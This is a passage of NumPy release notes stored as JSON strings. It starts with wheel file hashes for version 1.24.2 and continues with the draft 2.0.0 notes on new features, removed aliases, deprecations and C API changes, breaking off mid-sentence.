numpy-1.24.2-cp311-cp311-win_amd64.whl\n    d0a2db9d20117bf523dde15858398e7c0858aadca7c0f088ac0d6edd360e9ad2  numpy-1.24.2-cp38-cp38-macosx_10_9_x86_64.whl\n    c72a6b2f4af1adfe193f7beb91ddf708ff867a3f977ef2ec53c0ffb8283ab9f5  numpy-1.24.2-cp38-cp38-macosx_11_0_arm64.whl\n    c29e6bd0ec49a44d7690ecb623a8eac5ab8a923bce0bea6293953992edf3a76a  numpy-1.24.2-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    2eabd64ddb96a1239791da78fa5f4e1693ae2dadc82a76bc76a14cbb2b966e96  numpy-1.24.2-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e3ab5d32784e843fc0dd3ab6dcafc67ef806e6b6828dc6af2f689be0eb4d781d  numpy-1.24.2-cp38-cp38-win32.whl\n    76807b4063f0002c8532cfeac47a3068a69561e9c8715efdad3c642eb27c0756  numpy-1.24.2-cp38-cp38-win_amd64.whl\n    4199e7cfc307a778f72d293372736223e39ec9ac096ff0a2e64853b866a8e18a  numpy-1.24.2-cp39-cp39-macosx_10_9_x86_64.whl\n    adbdce121896fd3a17a77ab0b0b5eedf05a9834a18699db6829a64e1dfccca7f  numpy-1.24.2-cp39-cp39-macosx_11_0_arm64.whl\n    889b2cc88b837d86eda1b17008ebeb679d82875022200c6e8e4ce6cf549b7acb  numpy-1.24.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    f64bb98ac59b3ea3bf74b02f13836eb2e24e48e0ab0145bbda646295769bd780  numpy-1.24.2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    63e45511ee4d9d976637d11e6c9864eae50e12dc9598f531c035265991910468  numpy-1.24.2-cp39-cp39-win32.whl\n    a77d3e1163a7770164404607b7ba3967fb49b24782a6ef85d9b5f54126cc39e5  numpy-1.24.2-cp39-cp39-win_amd64.whl\n    92011118955724465fb6853def593cf397b4a1367495e0b59a7e69d40c4eb71d  numpy-1.24.2-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    f9006288bcf4895917d02583cf3411f98631275bc67cce355a7f39f8c14338fa  numpy-1.24.2-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    150947adbdfeceec4e5926d956a06865c1c690f2fd902efede4ca6fe2e657c3f  numpy-1.24.2-pp38-pypy38_pp73-win_amd64.whl\n    003a9f530e880cb2cd177cba1af7220b9aa42def9c4afc2a2fc3ee6be7eb2b22  numpy-1.24.2.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "2.0.0": "=========================\n\n.. note::\n\n    The release of 2.0 is in progress and the current release overview and\n    highlights are still in a draft state. However, the highlights should\n    already list the most significant changes detailed in the full notes below,\n    and those full notes should be complete (if not copy-edited well enough\n    yet).\n\nNumPy 2.0.0 is the first major release since 2006. It is the result of 11\nmonths of development since the last feature release and is the work of 198\ncontributors spread over 1041 pull requests. It contains a large number of\nexciting new features as well as changes to both the Python and C APIs.\n\nThis major release includes breaking changes that could not happen in a regular\nminor (feature) release - including an ABI break, changes to type promotion\nrules, and API changes which may not have been emitting deprecation warnings\nin 1.26.x. Key documents related to how to adapt to changes in NumPy 2.0, in\naddition to these release notes, include:\n\n- The :ref:`numpy-2-migration-guide`\n- The :ref:`NumPy 2.0-specific advice <numpy-2-abi-handling>` in\n  :ref:`for-downstream-package-authors`\n\n\nHighlights\n==========\n\nHighlights of this release include:\n\n- New features:\n\n  - A new variable-length string dtype, `~numpy.dtypes.StringDType` and a new\n    `numpy.strings` namespace with performant ufuncs for string operations,\n  - Support for ``float32`` and ``longdouble`` in all `numpy.fft` functions,\n  - Support for the array API standard in the main ``numpy`` namespace.\n\n- Performance improvements:\n\n  - Sorting functions (`sort`, `argsort`, `partition`, `argpartition`)\n    have been accelerated through the use of the Intel x86-simd-sort and Google\n    Highway libraries, and may see large (hardware-specific) speedups,\n  - macOS Accelerate support and binary wheels for macOS >=14, with significant\n    performance improvements for linear algebra operations on macOS, and wheels\n    that are about 3 times smaller,\n  - `numpy.char` fixed-length string operations have been accelerated by\n    implementing ufuncs that also support `~numpy.dtypes.StringDType` in\n    addition to the fixed-length string dtypes,\n  - A new tracing and introspection API, `~numpy.lib.introspect.opt_func_info`,\n    to determine which hardware-specific kernels are available and will be\n    dispatched to.\n\n- Python API improvements:\n\n  - A clear split between public and private API, with a new\n    :ref:`module structure <module-structure>`, and each public function now\n    available in a single place,\n  - Many removals of non-recommended functions and aliases. This should make\n    it easier to learn and use NumPy. The number of objects in the main\n    namespace decreased by ~10% and in ``numpy.lib`` by ~80%,\n  - :ref:`Canonical dtype names <canonical-python-and-c-types>` and a new\n    `~numpy.isdtype` introspection function,\n\n- C API improvements:\n\n  - A new :ref:`public C API for creating custom dtypes <dtype-api>`,\n  - Many outdated functions and macros removed, and private internals hidden to\n    ease future extensibility,\n  - New, easier to use, initialization functions:\n    :c:func:`PyArray_ImportNumPyAPI` and :c:func:`PyUFunc_ImportUFuncAPI`.\n\n- Improved behavior:\n\n  - Improvements to type promotion behavior was changed by adopting `NEP\n    50 <NEP50>`_. This fixes many user surprises about promotions which\n    previously often depended on data values of input arrays rather than only\n    their dtypes.  Please see the NEP and the :ref:`numpy-2-migration-guide`\n    for details as this change can lead to changes in output dtypes and lower\n    precision results for mixed-dtype operations.\n  - The default integer type on Windows is now ``int64`` rather than ``int32``,\n    matching the behavior on other platforms,\n  - The maximum number of array dimensions is changed from 32 to 64\n\n- Documentation:\n\n  - The reference guide navigation was significantly improved, and there is now\n    documentation on NumPy's :ref:`module structure <module-structure>`,\n  - The :ref:`building from source <building-from-source>` documentation was\n    completely rewritten,\n\nFurthermore there are many changes to NumPy internals, including continuing to\nmigrate code from C to C++, that will make it easier to improve and maintain\nNumPy in the future.\n\nThe \"no free lunch\" theorem dictates that there is a price to pay for all these\nAPI and behavior improvements and better future extensibility. This price is:\n\n1. Backwards compatibility. There are a significant number of breaking changes\n   to both the Python and C APIs. In the majority of cases, there are clear\n   error messages that will inform the user how to adapt their code. However,\n   there are also changes in behavior for which it was not possible to give\n   such an error message - these cases are all covered in the Deprecation and\n   Compatibility sections below, and in the :ref:`numpy-2-migration-guide`.\n\n   Note that there is a ``ruff`` mode to auto-fix many things in Python code.\n\n2. Breaking changes to the NumPy ABI. As a result, binaries of packages that\n   use the NumPy C API and were built against a NumPy 1.xx release will not\n   work with NumPy 2.0. On import, such packages will see an ``ImportError``\n   with a message about binary incompatibility.\n\n   It is possible to build binaries against NumPy 2.0 that will work at runtime\n   with both NumPy 2.0 and 1.x. See :ref:`numpy-2-abi-handling` for more details.\n\n   **All downstream packages that depend on the NumPy ABI are advised to do a\n   new release built against NumPy 2.0 and verify that that release works with\n   both 2.0 and 1.26 - ideally in the period between 2.0.0rc1 (which will be\n   ABI-stable) and the final 2.0.0 release to avoid problems for their users.**\n\nThe Python versions supported by this release are 3.9-3.12.\n\n\nNumPy 2.0 Python API removals\n=============================\n\n* ``np.geterrobj``, ``np.seterrobj`` and the related ufunc keyword argument\n  ``extobj=`` have been removed.  The preferred replacement for all of these\n  is using the context manager ``with np.errstate():``.\n\n  (`gh-23922 <https://github.com/numpy/numpy/pull/23922>`__)\n\n* ``np.cast`` has been removed. The literal replacement for\n  ``np.cast[dtype](arg)`` is ``np.asarray(arg, dtype=dtype)``.\n\n* ``np.source`` has been removed. The preferred replacement is\n  ``inspect.getsource``.\n\n* ``np.lookfor`` has been removed.\n\n  (`gh-24144 <https://github.com/numpy/numpy/pull/24144>`__)\n\n* ``numpy.who`` has been removed. As an alternative for the removed functionality, one\n  can use a variable explorer that is available in IDEs such as Spyder or Jupyter Notebook.\n\n  (`gh-24321 <https://github.com/numpy/numpy/pull/24321>`__)\n\n* Warnings and exceptions present in `numpy.exceptions` (e.g,\n  `~numpy.exceptions.ComplexWarning`,\n  `~numpy.exceptions.VisibleDeprecationWarning`) are no longer exposed in the\n  main namespace.\n* Multiple niche enums, expired members and functions have been removed from\n  the main namespace, such as: ``ERR_*``, ``SHIFT_*``, ``np.fastCopyAndTranspose``,\n  ``np.kernel_version``, ``np.numarray``, ``np.oldnumeric`` and ``np.set_numeric_ops``.\n\n  (`gh-24316 <https://github.com/numpy/numpy/pull/24316>`__)\n\n* Replaced ``from ... import *`` in the ``numpy/__init__.py`` with explicit imports.\n  As a result, these main namespace members got removed: ``np.FLOATING_POINT_SUPPORT``,\n  ``np.FPE_*``, ``np.NINF``, ``np.PINF``, ``np.NZERO``, ``np.PZERO``, ``np.CLIP``,\n  ``np.WRAP``, ``np.WRAP``, ``np.RAISE``, ``np.BUFSIZE``, ``np.UFUNC_BUFSIZE_DEFAULT``,\n  ``np.UFUNC_PYVALS_NAME``, ``np.ALLOW_THREADS``, ``np.MAXDIMS``, ``np.MAY_SHARE_EXACT``,\n  ``np.MAY_SHARE_BOUNDS``, ``add_newdoc``, ``np.add_docstring`` and\n  ``np.add_newdoc_ufunc``.\n\n  (`gh-24357 <https://github.com/numpy/numpy/pull/24357>`__)\n\n* Alias ``np.float_`` has been removed. Use ``np.float64`` instead.\n\n* Alias ``np.complex_`` has been removed. Use ``np.complex128`` instead.\n\n* Alias ``np.longfloat`` has been removed. Use ``np.longdouble`` instead.\n\n* Alias ``np.singlecomplex`` has been removed. Use ``np.complex64`` instead.\n\n* Alias ``np.cfloat`` has been removed. Use ``np.complex128`` instead.\n\n* Alias ``np.longcomplex`` has been removed. Use ``np.clongdouble`` instead.\n\n* Alias ``np.clongfloat`` has been removed. Use ``np.clongdouble`` instead.\n\n* Alias ``np.string_`` has been removed. Use ``np.bytes_`` instead.\n\n* Alias ``np.unicode_`` has been removed. Use ``np.str_`` instead.\n\n* Alias ``np.Inf`` has been removed. Use ``np.inf`` instead.\n\n* Alias ``np.Infinity`` has been removed. Use ``np.inf`` instead.\n\n* Alias ``np.NaN`` has been removed. Use ``np.nan`` instead.\n\n* Alias ``np.infty`` has been removed. Use ``np.inf`` instead.\n\n* Alias ``np.mat`` has been removed. Use ``np.asmatrix`` instead.\n\n* ``np.issubclass_`` has been removed. Use the ``issubclass`` builtin instead.\n\n* ``np.asfarray`` has been removed. Use ``np.asarray`` with a proper dtype instead.\n\n* ``np.set_string_function`` has been removed. Use ``np.set_printoptions``\n  instead with a formatter for custom printing of NumPy objects.\n\n* ``np.tracemalloc_domain`` is now only available from ``np.lib``.\n\n* ``np.recfromcsv`` and ``recfromtxt`` are now only available from ``np.lib.npyio``.\n\n* ``np.issctype``, ``np.maximum_sctype``, ``np.obj2sctype``, ``np.sctype2char``,\n  ``np.sctypes``, ``np.issubsctype`` were all removed from the\n  main namespace without replacement, as they where niche members.\n\n* Deprecated ``np.deprecate`` and ``np.deprecate_with_doc`` has been removed \n  from the main namespace. Use ``DeprecationWarning`` instead.\n\n* Deprecated ``np.safe_eval`` has been removed from the main namespace. \n  Use ``ast.literal_eval`` instead.\n\n  (`gh-24376 <https://github.com/numpy/numpy/pull/24376>`__)\n\n* ``np.find_common_type`` has been removed. Use ``numpy.promote_types`` or\n  ``numpy.result_type`` instead. To achieve semantics for the ``scalar_types``\n  argument, use ``numpy.result_type`` and pass ``0``, ``0.0``, or ``0j`` as a\n  Python scalar instead.\n\n* ``np.round_`` has been removed. Use ``np.round`` instead.\n\n* ``np.nbytes`` has been removed. Use ``np.dtype(<dtype>).itemsize`` instead.\n\n  (`gh-24477 <https://github.com/numpy/numpy/pull/24477>`__)\n\n* ``np.compare_chararrays`` has been removed from the main namespace. \n  Use ``np.char.compare_chararrays`` instead.\n\n* The ``charrarray`` in the main namespace has been deprecated. It can be imported\n  without a deprecation warning from ``np.char.chararray`` for now,\n  but we are planning to fully deprecate and remove ``chararray`` in the future.\n\n* ``np.format_parser`` has been removed from the main namespace. \n  Use ``np.rec.format_parser`` instead.\n\n  (`gh-24587 <https://github.com/numpy/numpy/pull/24587>`__)\n\n* Support for seven data type string aliases has been removed from ``np.dtype``:\n  ``int0``, ``uint0``, ``void0``, ``object0``, ``str0``, ``bytes0`` and ``bool8``.\n\n  (`gh-24807 <https://github.com/numpy/numpy/pull/24807>`__)\n\n* The experimental ``numpy.array_api`` submodule has been removed. Use the main\n  ``numpy`` namespace for regular usage instead, or the separate\n  ``array-api-strict`` package for the compliance testing use case for which\n  ``numpy.array_api`` was mostly used.\n\n  (`gh-25911 <https://github.com/numpy/numpy/pull/25911>`__)\n\n\n``__array_prepare__`` is removed\n--------------------------------\nUFuncs called ``__array_prepare__`` before running computations\nfor normal ufunc calls (not generalized ufuncs, reductions, etc.).\nThe function was also called instead of ``__array_wrap__`` on the\nresults of some linear algebra functions.\n\nIt is now removed. If you use it, migrate to ``__array_ufunc__`` or rely on\n``__array_wrap__`` which is called with a context in all cases, although only\nafter the result array is filled. In those code paths, ``__array_wrap__`` will\nnow be passed a base class, rather than a subclass array.\n\n(`gh-25105 <https://github.com/numpy/numpy/pull/25105>`__)\n\n\nDeprecations\n============\n\n* ``np.compat`` has been deprecated, as Python 2 is no longer supported.\n\n* ``np.safe_eval`` has been deprecated. ``ast.literal_eval`` should be used instead.\n\n  (`gh-23830 <https://github.com/numpy/numpy/pull/23830>`__)\n\n* ``np.recfromcsv``, ``np.recfromtxt``, ``np.disp``, ``np.get_array_wrap``,\n  ``np.maximum_sctype``, ``np.deprecate`` and ``np.deprecate_with_doc``\n  have been deprecated.\n\n  (`gh-24154 <https://github.com/numpy/numpy/pull/24154>`__)\n\n* ``np.trapz`` has been deprecated. Use ``np.trapezoid`` or a ``scipy.integrate`` function instead.\n\n* ``np.in1d`` has been deprecated. Use ``np.isin`` instead.\n\n* Alias ``np.row_stack`` has been deprecated. Use ``np.vstack`` directly.\n\n  (`gh-24445 <https://github.com/numpy/numpy/pull/24445>`__)\n\n* ``__array_wrap__`` is now passed ``arr, context, return_scalar`` and\n  support for implementations not accepting all three are deprecated.  Its signature\n  should be ``__array_wrap__(self, arr, context=None, return_scalar=False)``\n\n  (`gh-25409 <https://github.com/numpy/numpy/pull/25409>`__)\n\n* Arrays of 2-dimensional vectors for ``np.cross`` have been deprecated. Use\n  arrays of 3-dimensional vectors instead.\n\n  (`gh-24818 <https://github.com/numpy/numpy/pull/24818>`__)\n\n* ``np.dtype(\"a\")`` alias for ``np.dtype(np.bytes_)`` was deprecated. Use\n  ``np.dtype(\"S\")`` alias instead.\n\n  (`gh-24854 <https://github.com/numpy/numpy/pull/24854>`__)\n\n* Use of keyword arguments ``x`` and ``y`` with functions\n  ``assert_array_equal`` and ``assert_array_almost_equal`` has been deprecated.\n  Pass the first two arguments as positional arguments instead.\n\n  (`gh-24978 <https://github.com/numpy/numpy/pull/24978>`__)\n\n\n``numpy.fft`` deprecations for n-D transforms with None values in arguments\n---------------------------------------------------------------------------\nUsing ``fftn``, ``ifftn``, ``rfftn``, ``irfftn``, ``fft2``, ``ifft2``,\n``rfft2`` or ``irfft2`` with the ``s`` parameter set to a value that is not\n``None`` and the ``axes`` parameter set to ``None`` has been deprecated, in\nline with the array API standard. To retain current behaviour, pass a sequence\n[0, ..., k-1] to ``axes`` for an array of dimension k.\n\nFurthermore, passing an array to ``s`` which contains ``None`` values is\ndeprecated as the parameter is documented to accept a sequence of integers\nin both the NumPy docs and the array API specification. To use the default\nbehaviour of the corresponding 1-D transform, pass the value matching\nthe default for its ``n`` parameter. To use the default behaviour for every\naxis, the ``s`` argument can be omitted.\n\n(`gh-25495 <https://github.com/numpy/numpy/pull/25495>`__)\n\n\n``np.linalg.lstsq`` now defaults to a new ``rcond`` value\n---------------------------------------------------------\n`~numpy.linalg.lstsq` now uses the new rcond value of the machine precision\ntimes ``max(M, N)``.  Previously, the machine precision was used but a\nFutureWarning was given to notify that this change will happen eventually.\nThat old behavior can still be achieved by passing ``rcond=-1``.\n\n(`gh-25721 <https://github.com/numpy/numpy/pull/25721>`__)\n\n\nExpired deprecations\n====================\n\n* The ``np.core.umath_tests`` submodule has been removed from the public API.\n  (Deprecated in NumPy 1.15)\n\n  (`gh-23809 <https://github.com/numpy/numpy/pull/23809>`__)\n\n* The ``PyDataMem_SetEventHook`` deprecation has expired and it is\n  removed.  Use ``tracemalloc`` and the ``np.lib.tracemalloc_domain``\n  domain.  (Deprecated in NumPy 1.23)\n\n  (`gh-23921 <https://github.com/numpy/numpy/pull/23921>`__)\n\n* The deprecation of ``set_numeric_ops`` and the C functions\n  ``PyArray_SetNumericOps`` and ``PyArray_GetNumericOps`` has\n  been expired and the functions removed.  (Deprecated in NumPy 1.16)\n\n  (`gh-23998 <https://github.com/numpy/numpy/pull/23998>`__)\n\n* The ``fasttake``, ``fastclip``, and ``fastputmask``  ``ArrFuncs``\n  deprecation is now finalized.\n* The deprecated function ``fastCopyAndTranspose`` and its C counterpart\n  are now removed.\n* The deprecation of ``PyArray_ScalarFromObject`` is now finalized.\n\n  (`gh-24312 <https://github.com/numpy/numpy/pull/24312>`__)\n\n* ``np.msort`` has been removed. For a replacement, ``np.sort(a, axis=0)``\n  should be used instead.\n\n  (`gh-24494 <https://github.com/numpy/numpy/pull/24494>`__)\n\n\n* ``np.dtype((\"f8\", 1)`` will now return a shape 1 subarray dtype\n  rather than a non-subarray one.\n\n  (`gh-25761 <https://github.com/numpy/numpy/pull/25761>`__)\n\n* Assigning to the ``.data`` attribute of an ndarray is disallowed and will\n  raise.\n\n* ``np.binary_repr(a, width)`` will raise if width is too small.\n\n* Using ``NPY_CHAR`` in ``PyArray_DescrFromType()`` will raise, use\n  ``NPY_STRING`` ``NPY_UNICODE``, or ``NPY_VSTRING`` instead.\n\n  (`gh-25794 <https://github.com/numpy/numpy/pull/25794>`__)\n\n\nCompatibility notes\n===================\n\n``loadtxt`` and ``genfromtxt`` default encoding changed\n-------------------------------------------------------\n``loadtxt`` and ``genfromtxt`` now both default to ``encoding=None``\nwhich may mainly modify how ``converters`` work.\nThese will now be passed ``str`` rather than ``bytes``. Pass the\nencoding explicitly to always get the new or old behavior.\nFor ``genfromtxt`` the change also means that returned values will now be\nunicode strings rather than bytes.\n\n(`gh-25158 <https://github.com/numpy/numpy/pull/25158>`__)\n\n\n``f2py`` compatibility notes\n----------------------------\n* ``f2py`` will no longer accept ambiguous ``-m`` and ``.pyf`` CLI\n  combinations.  When more than one ``.pyf`` file is passed, an error is\n  raised. When both ``-m`` and a ``.pyf`` is passed, a warning is emitted and\n  the ``-m`` provided name is ignored.\n\n  (`gh-25181 <https://github.com/numpy/numpy/pull/25181>`__)\n\n* The ``f2py.compile()`` helper has been removed because it leaked memory, has\n  been marked as experimental for several years now, and was implemented as a\n  thin ``subprocess.run`` wrapper. It was also one of the test bottlenecks. See\n  `gh-25122 <https://github.com/numpy/numpy/issues/25122>`_ for the full\n  rationale. It also used several ``np.distutils`` features which are too\n  fragile to be ported to work with ``meson``.\n\n* Users are urged to replace calls to ``f2py.compile`` with calls to\n  ``subprocess.run(\"python\", \"-m\", \"numpy.f2py\",...`` instead, and to use\n  environment variables to interact with ``meson``. `Native files\n  <https://mesonbuild.com/Machine-files.html>`_ are also an option.\n\n  (`gh-25193 <https://github.com/numpy/numpy/pull/25193>`__)\n\n\nMinor changes in behavior of sorting functions\n----------------------------------------------\nDue to algorithmic changes and use of SIMD code, sorting functions with methods\nthat aren't stable may return slightly different results in 2.0.0 compared to\n1.26.x. This includes the default method of `~numpy.argsort` and\n`~numpy.argpartition`.\n\n\nRemoved ambiguity when broadcasting in ``np.solve``\n---------------------------------------------------\nThe broadcasting rules for ``np.solve(a, b)`` were ambiguous when ``b`` had 1\nfewer dimensions than ``a``. This has been resolved in a backward-incompatible\nway and is now compliant with the Array API. The old behaviour can be\nreconstructed by using ``np.solve(a, b[..., None])[..., 0]``.\n\n(`gh-25914 <https://github.com/numpy/numpy/pull/25914>`__)\n\n\nModified representation for ``Polynomial``\n------------------------------------------\nThe representation method for `~numpy.polynomial.polynomial.Polynomial` was\nupdated to include the domain in the representation. The plain text and latex\nrepresentations are now consistent. For example the output of\n``str(np.polynomial.Polynomial([1, 1], domain=[.1, .2]))`` used to be ``1.0 +\n1.0 x``, but now is ``1.0 + 1.0 (-3.0000000000000004 + 20.0 x)``.\n\n(`gh-21760 <https://github.com/numpy/numpy/pull/21760>`__)\n\n\nC API changes\n=============\n\n* The ``PyArray_CGT``, ``PyArray_CLT``, ``PyArray_CGE``, ``PyArray_CLE``,\n  ``PyArray_CEQ``, ``PyArray_CNE`` macros have been removed.\n\n* ``PyArray_MIN`` and ``PyArray_MAX`` have been moved from ``ndarraytypes.h``\n  to ``npy_math.h``.\n\n  (`gh-24258 <https://github.com/numpy/numpy/pull/24258>`__)\n\n* A C API for working with `numpy.dtypes.StringDType` arrays has been exposed.\n  This includes functions for acquiring and releasing mutexes which lock access\n  to the string data, as well as packing and unpacking UTF-8 bytestreams from\n  array entries.\n\n* ``NPY_NTYPES`` has been renamed to ``NPY_NTYPES_LEGACY`` as it does not\n  include new NumPy built-in DTypes. In particular the new string DType\n  will likely not work correctly with code that handles legacy DTypes.\n\n  (`gh-25347 <https://github.com/numpy/numpy/pull/25347>`__)\n\n* The C-API now only exports the static inline function versions\n  of the array accessors (previously this depended on using \"deprecated API\").\n  While we discourage it, the struct fields can still be used directly.\n\n  (`gh-25789 <https://github.com/numpy/numpy/pull/25789>`__)\n\n* NumPy now defines :c:func:`PyArray_Pack` to set an individual memory\n  address.  Unlike ``PyArray_SETITEM`` this function is equivalent to setting\n  an individual array item and does not require a NumPy array input.\n\n  (`gh-25954 <https://github.com/numpy/numpy/pull/25954>`__)\n\n* The ``->f`` slot has been removed from ``PyArray_Descr``.\n  If you use this slot, replace accessing it with\n  ``PyDataType_GetArrFuncs`` (see its documentation and the\n  :ref:`numpy-2-migration-guide`). In some cases using other functions like\n  ``PyArray_GETITEM`` may be an alternatives.\n* ``PyArray_GETITEM`` and ``PyArray_SETITEM`` now require the import of the\n  NumPy API table to be used and are no longer defined in ``ndarraytypes.h``.\n\n  (`gh-25812 <https://github.com/numpy/numpy/pull/25812>`__)\n\n* Due to runtime dependencies, the definition for functionality accessing\n  the dtype flags was moved from ``numpy/ndarraytypes.h`` and is only available\n  after including ``numpy/ndarrayobject.h`` as it requires ``import_array()``.\n  This includes ``PyDataType_FLAGCHK``, ``PyDataType_REFCHK`` and\n  ``NPY_BEGIN_THREADS_DESCR``.\n\n* The dtype flags on ``PyArray_Descr`` must now be accessed through the\n  ``PyDataType_FLAGS`` inline function to be compatible with both 1.x and 2.x.\n  This function is defined in ``npy_2_compat.h`` to allow backporting.\n  Most or all users should use ``PyDataType_FLAGCHK`` which is available on\n  1.x and does not require backporting.\n  Cython users should use Cython 3.  Otherwise access will go through Python\n  unless they use ``PyDataType_FLAGCHK`` instead.\n\n  (`gh-25816 <https://github.com/numpy/numpy/pull/25816>`__)\n\n\nDatetime functionality exposed in the C API and Cython bindings\n---------------------------------------------------------------\nThe functions ``NpyDatetime_ConvertDatetime64ToDatetimeStruct``,\n``NpyDatetime_ConvertDatetimeStructToDatetime64``,\n``NpyDatetime_ConvertPyDateTimeToDatetimeStruct``,\n``NpyDatetime_GetDatetimeISO8601StrLen``, ``NpyDatetime_MakeISO8601Datetime``,\nand ``NpyDatetime_ParseISO8601Datetime`` have been added to the C API to\nfacilitate converting between strings, Python datetimes, and NumPy datetimes in\nexternal libraries.\n\n(`gh-21199 <https://github.com/numpy/numpy/pull/21199>`__)\n\n\nConst correctness for the generalized ufunc C API\n-------------------------------------------------\nThe NumPy C API's functions for constructing generalized ufuncs\n(``PyUFunc_FromFuncAndData``, ``PyUFunc_FromFuncAndDataAndSignature``,\n``PyUFunc_FromFuncAndDataAndSignatureAndIdentity``) take ``types`` and ``data``\narguments that are not modified by NumPy's internals. Like the ``name`` and\n``doc`` arguments, third-party Python extension modules are likely to supply\nthese arguments from static constants. The ``types`` and ``data`` arguments are\nnow const-correct: they are declared as ``const char *types`` and\n``void *const *data``, respectively. C code should not be affected, but C++\ncode may be.\n\n(`gh-23847 <https://github.com/numpy/numpy/pull/23847>`__)\n\n\nLarger ``NPY_MAXDIMS`` and ``NPY_MAXARGS``, ``NPY_RAVEL_AXIS`` introduced\n-------------------------------------------------------------------------\n``NPY_MAXDIMS`` is now 64, you may want to review its use.  This is usually\nused in a stack allocation, where the increase should be safe.\nHowever, we do encourage generally to remove any use of ``NPY_MAXDIMS`` and\n``NPY_MAXARGS`` to eventually allow removing the constraint completely.\nFor the conversion helper and C-API functions mirroring Python ones such as\n``take``, ``NPY_MAXDIMS`` was used to mean ``axis=None``. Such usage must be\nreplaced with ``NPY_RAVEL_AXIS``. See also :ref:`migration_maxdims`.\n\n(`gh-25149 <https://github.com/numpy/numpy/pull/25149>`__)\n\n\n``NPY_MAXARGS`` not constant and ``PyArrayMultiIterObject`` size change\n-----------------------------------------------------------------------\nSince ``NPY_MAXARGS`` was increased, it is now a runtime constant and not\ncompile-time constant anymore.\nWe expect almost no users to notice this.  But if used for stack allocations\nit now must be replaced with a custom constant using ``NPY_MAXARGS`` as an\nadditional runtime check.\n\nThe ``sizeof(PyArrayMultiIterObject)`` no longer includes the full size\nof the object.  We expect nobody to notice this change.  It was necessary\nto avoid issues with Cython.\n\n(`gh-25271 <https://github.com/numpy/numpy/pull/25271>`__)\n\n\nRequired changes for custom legacy user dtypes\n----------------------------------------------\nIn order to improve our DTypes it is unfortunately necessary\nto break the ABI, which requires some changes for dtypes registered\nwith ``PyArray_RegisterDataType``.\nPlease see the documentation of ``PyArray_RegisterDataType`` for how\nto adapt your code and achieve compatibility with both 1.x and 2.x.\n\n(`gh-25792 <https://github.com/numpy/numpy/pull/25792>`__)\n\n\nNew Public DType API\n--------------------\nThe C implementation of the NEP 42 DType API is now public. While the DType API\nhas shipped in NumPy for a few versions, it was only usable in sessions with a\nspecial environment variable set. It is now possible to write custom DTypes\noutside of NumPy using the new DType API and the normal ``import_array()``\nmechanism for importing the numpy C API.\n\nSee :ref:`dtype-api` for more details about the API. As always with a new\nfeature, please report any bugs you run into implementing or using a new\nDType. It is likely that downstream C code that works with dtypes will need to\nbe updated to work correctly with new DTypes.\n\n(`gh-25754 <https://github.com/numpy/numpy/pull/25754>`__)\n\n\nNew C-API import functions\n--------------------------\nWe have now added ``PyArray_ImportNumPyAPI`` and ``PyUFunc_ImportUFuncAPI``\nas static inline functions to import the NumPy C-API tables.\nThe new functions have two advantages over ``import_array`` and\n``import_ufunc``:\n\n- They check whether the import was already performed and are light-weight\n  if not, allowing to add them judiciously (although this is not preferable\n  in most cases).\n- The old mechanisms were macros rather than functions which included a\n  ``return`` statement.\n\nThe ``PyArray_ImportNumPyAPI()`` function is included in ``npy_2_compat.h``\nfor simpler backporting.\n\n(`gh-25866 <https://github.com/numpy/numpy/pull/25866>`__)\n\n\nStructured dtype information access through functions\n-----------------------------------------------------\nThe dtype structures fields ``c_metadata``, ``names``,\n``fields``, and ``subarray`` must now be accessed through new\nfunctions following the same names, such as ``PyDataType_NAMES``.\nDirect access of the fields is not valid as they do not exist for\nall ``PyArray_Descr`` instances.\nThe ``metadata`` field is kept, but the macro version should also be preferred.\n\n(`gh-25802 <https://github.com/numpy/numpy/pull/25802>`__)\n\n\nDescriptor ``elsize`` and ``alignment`` access\n----------------------------------------------\nUnless compiling only with NumPy 2 support, the ``elsize`` and ``aligment``\nfields must now be accessed via ``PyDataType_ELSIZE``,\n``PyDataType_SET_ELSIZE``, and ``PyDataType_ALIGNMENT``.\nIn cases where the descriptor is attached to an array, we advise\nusing ``PyArray_ITEMSIZE`` as it exists on all NumPy versions.\nPlease see :ref:`migration_c_descr` for more information.\n\n(`gh-25943 <https://github.com/numpy/numpy/pull/25943>`__)\n\n\nNumPy 2.0 C API removals\n========================\n\n* ``npy_interrupt.h`` and the corresponding macros like ``NPY_SIGINT_ON``\n  have been removed.  We recommend querying ``PyErr_CheckSignals()`` or\n  ``PyOS_InterruptOccurred()`` periodically (these do currently require\n  holding the GIL though).\n\n* The ``noprefix.h`` header has been removed. Replace missing symbols with\n  their prefixed counterparts (usually an added ``NPY_`` or ``npy_``).\n\n  (`gh-23919 <https://github.com/numpy/numpy/pull/23919>`__)\n\n* ``PyUFunc_GetPyVals``, ``PyUFunc_handlefperr``, and ``PyUFunc_checkfperr``\n  have been removed.\n  If needed, a new backwards compatible function to raise floating point errors\n  could be restored. Reason for removal: there are no known users and the\n  functions would have made ``with np.errstate()`` fixes much more difficult).\n\n  (`gh-23922 <https://github.com/numpy/numpy/pull/23922>`__)\n\n* The ``numpy/old_defines.h`` which was part of the API deprecated since NumPy 1.7\n  has been removed.  This removes macros of the form ``PyArray_CONSTANT``.\n  The `replace_old_macros.sed <https://github.com/numpy/numpy/blob/main/tools/replace_old_macros.sed>`__\n  script may be useful to convert them to the ``NPY_CONSTANT`` version.\n\n  (`gh-24011 <https://github.com/numpy/numpy/pull/24011>`__)\n\n* The ``legacy_inner_loop_selector`` member of the ufunc struct is removed\n  to simplify improvements to the dispatching system.\n  There are no known users overriding or directly accessing this member.\n\n  (`gh-24271 <https://github.com/numpy/numpy/pull/24271>`__)\n\n* ``NPY_INTPLTR`` has been removed to avoid confusion (see ``intp``\n  redefinition).\n\n  (`gh-24888 <https://github.com/numpy/numpy/pull/24888>`__)\n\n* The advanced indexing ``MapIter`` and related API has been removed.\n  The (truly) public part of it was not well tested and had only one\n  known user (Theano).  Making it private will simplify improvements\n  to speed up ``ufunc.at``, make advanced indexing more maintainable,\n  and was important for increasing the maximum number of dimensions of arrays\n  to 64. Please let us know if this API is important to you so we can find a\n  solution together.\n\n  (`gh-25138 <https://github.com/numpy/numpy/pull/25138>`__)\n\n* The ``NPY_MAX_ELSIZE`` macro has been removed, as it only ever 